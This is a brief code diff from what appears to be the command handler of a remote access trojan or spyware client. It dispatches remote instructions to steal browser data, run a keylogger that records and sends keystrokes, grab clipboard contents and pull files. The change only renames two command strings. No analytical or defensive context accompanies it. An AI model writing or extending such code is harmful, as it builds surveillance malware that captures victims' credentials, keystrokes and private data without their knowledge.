@@ -61,9 +61,9 @@ def command(data):
         send_browser_data(sio)
     elif command == 'keylogger':
         record_and_send_keyboard_log(duration, sio)
-    elif command == 'papier':
+    elif command == 'clipboard':
         get_clipboard_content(sio)
-    elif command == 'download_file':
+    elif command == 'downloadfile':
         download_file(file_path, sio)
 
 
